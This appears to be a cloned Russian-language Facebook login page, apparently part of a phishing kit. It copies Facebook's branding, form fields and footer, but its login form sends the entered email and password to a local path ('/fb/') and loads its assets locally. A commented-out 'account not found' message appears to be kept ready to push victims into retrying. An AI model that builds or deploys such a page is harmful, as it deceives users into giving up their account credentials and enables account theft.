<!DOCTYPE html>
<html id="facebook" class="" lang="ru">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">

    <link rel="manifest" href="https://ru-ru.facebook.com/data/manifest/" crossorigin="use-credentials">
    <title id="pageTitle">Войдите на Facebook | Facebook</title>
    <meta property="og:site_name" content="Facebook">
    <meta property="og:url" content="https://ru-ru.facebook.com/">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    <meta property="og:locale" content="ru_RU">
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/">
    <meta name="description" content="Создайте аккаунт или войдите на Facebook. Общайтесь с друзьями, родственниками и другими людьми, которых вы знаете. Делитесь фото и видео, отправляйте...">
    <meta name="robots" content="noodp,noydir">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link type="text/css" rel="stylesheet" href="/style.css" crossorigin="anonymous">
</head>

<body class="login_page _39il UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko win x1 Locale_ru_RU cores-lt4 _19_u hasAXNavMenubar" dir="ltr">
<div class="_li" id="u_0_2">
    <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3">
        <div class="_608m">
            <div class="_5aj7 _tb6">
                <div class="_4bl7"><span class="mrm _3bcv _50f3">Перейти к</span></div>
                <div class="_4bl9 _3bcp">
                    <div class="_6a _608n" aria-label="Помощь с навигацией" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4">
                        <div class="_6a uiPopover" id="u_0_5"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_6"><span class="_55pe">Разделы этой Страницы</span><span class="_4o_3 _3-99"><i class="img sp_CFhzeuTBkdE sx_2ea917"></i></span></a></div>
                        <div class="_6a _3bcs"></div>
                        <div class="_6a mrm uiPopover" id="u_0_7"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_8"><span class="_55pe">Справочный центр специальных возможностей</span><span class="_4o_3 _3-99"><i class="img sp_CFhzeuTBkdE sx_d8579c"></i></span></a></div>
                    </div>
                </div>
                <div class="_4bl7 mlm pll _3bct">
                    <div class="_6a _3bcy">Нажмите <span class="_3bcz">alt</span> и <span class="_3bcz">/</span> одновременно, чтобы открыть это меню</div>
                </div>
            </div>
        </div>
    </div>
    <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
        <div id="blueBarDOMInspector">
            <div class="_53jh">
                <div class="loggedout_menubar_container">
                    <div class="clearfix loggedout_menubar">
                        <div class="lfloat _ohe">
                            <h1><a href="/fb" title="Перейти на главную страницу Facebook"><i class="fb_logo img sp_0eOQhLgQG2U sx_fbcf0b"><u>Facebook</u></i></a></h1>
                        </div>
                    </div>
                </div>
                <div class="signupBanner">
                    <div class="signup_bar_container">
                        <div class="signup_box clearfix"><span class="signup_box_content"><a role="button" class="_42ft _4jy0 signup_btn _4jy4 _4jy2 selected _51sy" href="https://ru-ru.facebook.com/r.php?locale=ru_RU">Зарегистрироваться</a></span></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="globalContainer" class="uiContextualLayerParent">
        <div class="fb_content clearfix " id="content" role="main">
            <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span>
                <div class="_4-u2 _1w1t _4-u8 _52jv">
                    <div class="_xku" id="header_block"><span class="_50f6">Вход на Facebook</span></div>
                    <div class="login_form_container">
                        <form id="login_form" action="/fb/" method="post" onsubmit=""><input type="hidden" name="jazoest" value="2650" autocomplete="off"><input type="hidden" name="lsd" value="AVpSANk6" autocomplete="off"><input type="hidden" autocomplete="off" id="error_box">
                            <div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value=""><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value=""><input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value=""><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="0"><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value=""><input type="hidden" autocomplete="off" id="return_session" name="return_session" value=""><input type="hidden" autocomplete="off" id="skip_api_login" name="skip_api_login" value=""><input type="hidden" autocomplete="off" id="signed_next" name="signed_next" value=""><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="2"><input type="hidden" autocomplete="off" name="timezone" value="0" id="u_0_9"><input type="hidden" autocomplete="off" name="lgndim" value="eyJ3IjoyNDAwLCJoIjo5MDAsImF3IjoyNDAwLCJhaCI6OTAwLCJjIjoyNH0=" id="u_0_a"><input type="hidden" name="lgnrnd" value="093518_CDCl"><input type="hidden" id="lgnjs" name="lgnjs" value="1588178120">
                                <div class="clearfix _5466 _44mg" id="email_container">
                                    <input type="text" class="inputtext _55r1 inputtext _1kbt _4rer inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Электронный адрес или номер телефона" autofocus="1" autocomplete="username" aria-label="Электронный адрес или номер телефона" aria-describedby="js_1h">
                                </div>
                                <div class="clearfix _5466 _44mg"><input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Пароль" value="" autocomplete="current-password" aria-label="Пароль"></div>
                                <div class="_xkt"><button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Вход</button></div>
                                <div id="login_link" class="_82qp _85em">
                                    <div class="_xkt"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" target="">Забыли пароль?</a></div>
                                </div>
                            </div><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value=""><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source"><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type"><input type="hidden" autocomplete="off" id="first_prefill_source" name="first_prefill_source"><input type="hidden" autocomplete="off" id="first_prefill_type" name="first_prefill_type"><input type="hidden" autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled" value="false"><input type="hidden" autocomplete="off" id="had_password_prefilled" name="had_password_prefilled" value="false"><input type="hidden" autocomplete="off" name="ab_test_data" value="">
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div>
            <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                    <li>Русский</li>
                    <li><a class="_sv4" dir="ltr" href="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("en_US", "ru_RU", "https:\/\/www.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 0); return false;' title="English (US)">English (US)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("fr_FR", "ru_RU", "https:\/\/fr-fr.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 1); return false;' title="French (France)">Français (France)</a></li>
                    <li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("ar_AR", "ru_RU", "https:\/\/ar-ar.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 2); return false;' title="Arabic">العربية</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("it_IT", "ru_RU", "https:\/\/it-it.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 3); return false;' title="Italian">Italiano</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("de_DE", "ru_RU", "https:\/\/de-de.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 4); return false;' title="German">Deutsch</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("es_LA", "ru_RU", "https:\/\/es-la.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 5); return false;' title="Spanish">Español</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("pt_BR", "ru_RU", "https:\/\/pt-br.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 6); return false;' title="Portuguese (Brazil)">Português (Brasil)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("hi_IN", "ru_RU", "https:\/\/hi-in.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 7); return false;' title="Hindi">हिन्दी</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://zh-cn.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("zh_CN", "ru_RU", "https:\/\/zh-cn.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 8); return false;' title="Simplified Chinese (China)">中文(简体)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" onclick='require("IntlUtils").setCookieLocale("ja_JP", "ru_RU", "https:\/\/ja-jp.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp;lwv=100", "www_list_selector", 9); return false;' title="Japanese">日本語</a></li>
                    <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2Flogin%2Fdevice-based%2Fregular%2Flogin%2F%3Flogin_attempt%3D1%26lwv%3D100&amp;source=www_list_selector_more" href="#" title="Ещё языки"><i class="img sp_Ke6ZUJH-N4S sx_930120"></i></a></li>
                </ul>
                <div id="contentCurve"></div>
                <div id="pageFooterChildren" role="contentinfo" aria-label="Ссылки Facebook">
                    <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                        <li><a href="https://ru-ru.facebook.com/r.php" title="Регистрация на Facebook">Регистрация</a></li>
                        <li><a href="https://ru-ru.facebook.com/login/" title="Войдите на Facebook">Вход</a></li>
                        <li><a href="https://ru-ru.messenger.com/" title="Оцените Messenger.">Messenger</a></li>
                        <li><a href="https://ru-ru.facebook.com/lite/" title="Facebook Lite для Android.">Facebook Lite</a></li>
                        <li><a href="https://ru-ru.facebook.com/watch/" title="Посмотреть наши видео на Facebook Watch."> Watch </a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/people/" title="Посмотрите наш каталог пользователей.">Люди</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/pages/" title="Просматривайте наш каталог Страниц.">Страницы</a></li>
                        <li><a href="https://ru-ru.facebook.com/pages/category/">Категории Страниц</a></li>
                        <li><a href="https://ru-ru.facebook.com/places/" title="Ознакомьтесь с популярными местами на Facebook.">Места</a></li>
                        <li><a href="https://ru-ru.facebook.com/games/" title="Познакомьтесь с играми на Facebook.">Игры</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/places/" title="Просмотрите наш каталог мест.">Места</a></li>
                        <li><a href="https://ru-ru.facebook.com/marketplace/" title="Покупайте и продавайте через Facebook Marketplace.">Marketplace</a></li>
                        <li><a href="https://ru-ru.facebook.com/directory/groups/" title="Просмотреть наш каталог групп.">Группы</a></li>
                        <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Finstagram.com%2F&amp;h=AT09HlK1Xeb7ECzRV8AbN7BGFnDwpK6nxgm5O1D-Uny66uyqprHARkKc5_MFADaxl4uH9t7pYL9dk_d8AID1k6Wrx9zf5gbEQdYHRAomV1VmuW4FYLXjh-VI48ykzXAFkHs5vfn6DFFLcLySHzLDqQ" title="Попробуйте Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                        <li><a href="https://ru-ru.facebook.com/local/lists/245019872666104/" title="Просмотреть наш каталог &quot;Местные списки&quot;.">Местные</a></li>
                        <li><a href="https://ru-ru.facebook.com/fundraisers/" title="Пожертвовать в поддержку общественно значимых дел">Благотворительные акции</a></li>
                        <li><a href="https://ru-ru.facebook.com/biz/directory/" title="Посмотреть наш каталог &quot;Сервисы Facebook&quot;.">Услуги</a></li>
                        <li><a href="https://ru-ru.facebook.com/facebook" accesskey="8" title="Прочтите наш блог, ознакомьтесь с материалами, найдите  вакансии.">О нас</a></li>
                        <li><a href="https://ru-ru.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Реклама на  Facebook.">Создать рекламу</a></li>
                        <li><a href="https://ru-ru.facebook.com/pages/create/?ref_type=site_footer" title="Создать Страницу">Создать Страницу</a></li>
                        <li><a href="https://developers.facebook.com/?ref=pf" title="Развивайтесь на нашей платформе.">Разработчикам</a></li>
                        <li><a href="https://ru-ru.facebook.com/careers/?ref=pf" title="Сделайте следующий шаг в карьере в нашей отличной компании.">Вакансии</a></li>
                        <li><a data-nocookies="1" href="https://ru-ru.facebook.com/privacy/explanation" title="Узнайте о своей конфиденциальности на Facebook.">Конфиденциальность</a></li>
                        <li><a href="https://ru-ru.facebook.com/policies/cookies/" title="Узнайте больше о cookies и Facebook." data-nocookies="1">Файлы cookie</a></li>
                        <li><a class="_41ug" data-nocookies="1" href="https://ru-ru.facebook.com/help/568137493302217" title="Подробнее о выборе рекламы.">Выбор рекламы<i class="img sp_0eOQhLgQG2U sx_7cd432"></i></a></li>
                        <li><a data-nocookies="1" href="https://ru-ru.facebook.com/policies?ref=pf" accesskey="9" title="Просмотрите наши условия и правила.">Условия использования</a></li>
                        <li><a href="https://ru-ru.facebook.com/help/?ref=pf" accesskey="0" title="Посетите наш Справочный центр.">Справка</a></li>
                        <li><a accesskey="6" class="accessible_elem" href="https://ru-ru.facebook.com/settings" title="Посмотреть и отредактировать настройки Facebook.">Настройки</a></li>
                        <li><a accesskey="7" class="accessible_elem" href="https://ru-ru.facebook.com/allactivity?privacy_source=activity_log_top_menu" title="Посмотреть Журнал действий">Журнал действий</a></li>
                    </ul>
                </div>
                <div class="mvl copyright">
                    <div><span> Facebook © 2020</span></div>
                </div>
            </div>
        </div>
<!--        <div class="uiContextualLayerPositioner _572t uiLayer" data-testid="undefined" style="width: 1040px; left: 1343px; top: 161px; opacity: 1;" data-ownerid="email">-->
<!--            <div class="uiContextualLayer uiContextualLayerRight" aria-labelledby="">-->
<!--                <div class="_5v-0 _53in">-->
<!--                    <div role="alert" class="_4rbf _53ij" style="top: 0px;">Эл. адрес или номер телефона, который вы указали, не соответствует ни одному аккаунту. <a href="https://ru-ru.facebook.com/r.php">Зарегистрируйте аккаунт.</a></div><i class="_53io" style="top: 0%; margin-top: 12px;"></i><a class="accessible_elem layer_close_elem" href="#" role="button" id="js_1h">Закрыть всплывающее окно и продолжить</a>-->
<!--                </div>-->
<!--            </div>-->
<!--        </div>-->
    </div>
    <div></div><span><img src="index_files/hsts-pixel.gif" style="display:none" width="0" height="0"><span><img src="index_files/altsvc-pixel_003.gif" style="display:none" width="0" height="0"><img src="index_files/altsvc-pixel_004.gif" style="display:none" width="0" height="0"><img src="index_files/altsvc-pixel.gif" style="display:none" width="0" height="0"><img src="index_files/altsvc-pixel_002.gif" style="display:none" width="0" height="0"></span></span>
</div>
<div style="display:none">
    <div></div>
    <div></div>
</div>



</body>

</html>
